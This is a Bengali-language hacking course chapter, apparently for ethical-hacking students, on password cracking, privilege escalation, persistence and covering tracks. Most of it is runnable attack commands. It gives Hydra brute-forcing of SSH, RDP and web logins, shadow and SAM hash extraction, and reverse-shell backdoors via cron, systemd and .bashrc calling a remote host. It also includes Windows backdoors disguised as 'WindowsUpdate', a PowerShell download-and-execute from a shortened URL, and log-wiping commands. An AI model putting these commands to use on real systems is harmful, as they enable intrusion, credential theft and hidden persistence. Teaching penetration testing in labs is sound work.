# অধ্যায় ১৭: System Hacking

## সহজ কথায়:
System hacking = পাসওয়ার্ড ক্র্যাক করা, privilege বাড়ানো, আর system-এর full control নেওয়া। এটা শিখলে বুঝবে attacker কীভাবে ভিতরে ঢোকে।

---

## ১৭.১ Password Cracking Techniques

### Types of Password Attacks:

| Attack Type | কীভাবে কাজ করে | Speed |
|-------------|---------------|-------|
| **Dictionary Attack** | Common password list (rockyou.txt) | Fast |
| **Brute Force** | সব combination try | Slow (100% success) |
| **Rainbow Table** | Pre-computed hash table | Very fast (but large storage) |
| **Hybrid Attack** | Dictionary + numbers/symbols | Medium |
| **Mask Attack** | Pattern-based (known format) | Best when partial info |

---

## ১৭.২ Hashcat — GPU Password Cracking

Hashcat = বিশ্বের সবচেয়ে দ্রুত password cracker (GPU ব্যবহার করে)।

### Install:
```bash
# Kali/Parrot তে:
sudo apt install hashcat

# Check GPU:
hashcat -I  # দেখো OpenCL/CUDA device আছে কিনা
```

### Hash Mode (Common):

| Hash Mode | Hash Type | উদাহরণ |
|-----------|-----------|---------|
| **0** | MD5 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| **100** | SHA1 | da39a3ee5e6b4b0d3255bfef95601890afd80709 |
| **1400** | SHA256 | 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e... |
| **1700** | SHA512 | b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e0... |
| **1000** | NTLM | Windows password hash |
| **3200** | bcrypt | $2a$10$N9qo8uLOickgx2ZMRZoMye |
| **1800** | sha512crypt | Linux shadow file |
| **22000** | WPA-PBKDF2 | WiFi handshake |

### Basic Usage:

```bash
# Dictionary attack (MD5 hash):
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM (Windows):
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# SHA256 with rules:
hashcat -m 1400 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8 letter, all lower):
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Show cracked passwords:
hashcat -m 0 --show hashes.txt
```

### Wordlists Location:
```bash
# Kali তে:
/usr/share/wordlists/rockyou.txt.gz

# Extract:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
# Output: 14,344,391 passwords!

# Other wordlists:
/usr/share/seclists/Passwords/
/usr/share/wordlists/fasttrack.txt
```

---

## ১৭.৩ John the Ripper — CPU Password Cracking

John = Hashcat-এর CPU-based cousin। ধীর কিন্তু versatile।

### Usage:

```bash
# Unshadow (combine passwd + shadow):
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack:
john hashes.txt

# Show pass:
john --show hashes.txt

# Specific format:
john --format=raw-md5 hashes.txt

# Wordlist:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Hash Extraction Examples:

```bash
# Windows SAM hash extraction:
# Use mimikatz or samdump2
samdump2 SYSTEM SAM > hashes.txt

# Linux shadow file:
cat /etc/shadow | grep -v "!" | grep -v "*" > hashes.txt

# ZIP file:
zip2john protected.zip > zip.hash
john zip.hash

# PDF:
pdf2john document.pdf > pdf.hash
john pdf.hash
```

---

## ১৭.৪ Hydra — Online Brute Force (Network Service)

Hydra = online password attack tool। বিভিন্ন service-এ brute force।

```bash
# SSH brute force:
hydra -l admin -P passwords.txt 192.168.1.10 ssh

# FTP:
hydra -l admin -P rockyou.txt 192.168.1.10 ftp

# HTTP POST form:
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# RDP (Windows Remote Desktop):
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# MySQL:
hydra -l root -P rockyou.txt mysql://192.168.1.10

# SMTP:
hydra -l admin -P rockyou.txt smtp://192.168.1.10

# Multiple users:
hydra -L users.txt -P passwords.txt ssh://192.168.1.10
```

### Output:
```bash
[22][ssh] host: 192.168.1.10   login: admin   password: password123
[21][ftp] host: 192.168.1.10   login: admin   password: letmein
```

---

## ১৭.৫ Privilege Escalation

একবার user-level access পেলে, **root/admin** হওয়ার চেষ্টা — এইটাই privilege escalation।

### Linux Privilege Escalation:

#### A. SUID Binary Exploitation:
```bash
# SUID binary খুঁজো:
find / -perm -4000 2>/dev/null

# Output:
# /usr/bin/passwd
# /usr/bin/su
# /usr/bin/sudo
# /usr/local/bin/script  ← custom SUID binary

# Check GTFO bins:
# Browser: https://gtfobins.github.io/
```

#### B. sudo -l Abuse:
```bash
# কোন sudo command চালাতে পারো?
sudo -l

# Output:
# User kali may run:
# (ALL : ALL) ALL  ← full sudo (already root!)
# 
# অথবা:
# (root) NOPASSWD: /usr/bin/vim  ← vim root permission-এ চলে

# Exploit:
sudo vim -c ':!/bin/sh'  # vim থেকে shell
```

#### C. Kernel Exploit:
```bash
# Kernel version বের করো:
uname -a

# Search exploit:
searchsploit linux kernel 3.10

# Example:
searchsploit -m 37292  # Linux 3.xx dirtycow
gcc 37292.c -o exploit
./exploit
# → Root!
```

#### D. Docker/LXC Escape:
```bash
# যদি docker group-এ থাকো:
docker run -v /:/mnt -it alpine
chroot /mnt
# → host file system accessible

# LXC:
lxc-attach -n container_name
```

### Windows Privilege Escalation:

```powershell
# Who am I?
whoami

# System info:
systeminfo

# Installed patches:
wmic qfe list

# Services with weak permissions:
sc query
accesschk.exe -uwcqv *

# AlwaysInstallElevated check:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### PE Automation Scripts:

```bash
# Linux:
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Alternative:
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
./lse.sh -i

# Windows (PowerShell):
# PowerUp.ps1
IEX(New-Object Net.WebClient).downloadString('http://bit.ly/PowerUp')
Invoke-AllChecks
```

---

## ১৭.৬ Maintaining Access (Persistence Techniques)

### Linux Persistence:

```bash
# 1. SSH Key:
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub >> /target/.ssh/authorized_keys

# 2. Cron Job:
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'") | crontab -

# 3. Systemd Service:
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Service]
ExecStart=/bin/bash -c "nc -e /bin/sh 192.168.1.5 4444"
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor

# 4. .bashrc backdoor:
echo "nc -e /bin/sh 192.168.1.5 4444 &" >> ~/.bashrc
```

### Windows Persistence:

```powershell
# Registry Run key (user login-এ run):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\backdoor.exe"

# Scheduled Task:
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# Service:
sc create "WindowsUpdateSvc" binPath= "C:\backdoor.exe"
sc start "WindowsUpdateSvc"

# WMI Persistence:
# Use PowerSploit
```

---

## ১৭.৭ Clearing Tracks

```bash
# Linux:
history -c
rm -f ~/.bash_history ~/.zsh_history
rm -rf /var/log/*.log
journalctl --rotate && journalctl --vacuum-time=1s

# Windows:
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
del %WINDIR%\*.log /a /s
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. Hashcat practice:
   - rockyou.txt থেকে প্রথম ১০০০ password নাও
   - MD5 hash create করো: echo -n "password123" | md5sum
   - Hashcat দিয়ে crack করো

২. John the Ripper:
   - নিজের Linux shadow hash extract করো
   - Dictionary attack চালাও

৩. Hydra (Metasploitable2 তে):
   - FTP brute force: hydra -l msfadmin -P rockyou.txt ftp://192.168.56.102
   - SSH brute force: একইভাবে

৪. Privilege Escalation:
   - LinEnum.sh download করো + Metasploitable2-তে upload
   - Run করো → কী পেলে?
```

---

## 📌 মনে রাখো

| Technique | Tool | Use Case |
|-----------|------|----------|
| **Hash Cracking** | Hashcat (GPU), John (CPU) | Offline password |
| **Brute Force** | Hydra | Online service (SSH, FTP) |
| **SUID Exploit** | find / -perm -4000 | Linux PE |
| **sudo Exploit** | sudo -l | Linux PE |
| **Kernel Exploit** | searchsploit | Linux/Windows PE |
| **Persistence** | SSH key, cron, service | Maintain access |

**পরবর্তী — Phishing Attacks! 🎣**
